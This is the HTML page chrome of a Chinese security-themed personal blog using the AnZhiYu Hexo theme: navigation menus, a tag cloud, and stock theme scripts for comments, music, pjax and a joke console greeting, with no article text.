class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>2</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>1</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>